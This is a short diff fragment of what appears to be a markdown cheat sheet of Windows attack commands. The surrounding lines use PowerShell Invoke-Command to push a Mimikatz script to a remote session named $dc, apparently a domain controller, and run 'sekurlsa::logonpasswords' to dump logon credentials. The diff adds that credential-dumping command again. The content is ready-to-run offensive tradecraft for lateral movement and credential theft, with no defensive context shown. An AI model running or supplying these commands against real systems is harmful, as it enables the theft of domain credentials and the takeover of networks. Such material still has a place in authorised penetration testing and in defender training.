@@ -20,5 +20,7 @@ Invoke-Command  -FilePath{C:\temp\mimi.ps1} -Session $dc
  Invoke-Command -ScriptBlock{invoke-mimikatz -command '"sekurlsa::logonpasswords"'} $dc
 ```
 
+Invoke-Command -ScriptBlock{invoke-mimikatz -command '"sekurlsa::logonpasswords"'} $dc
+
 
 
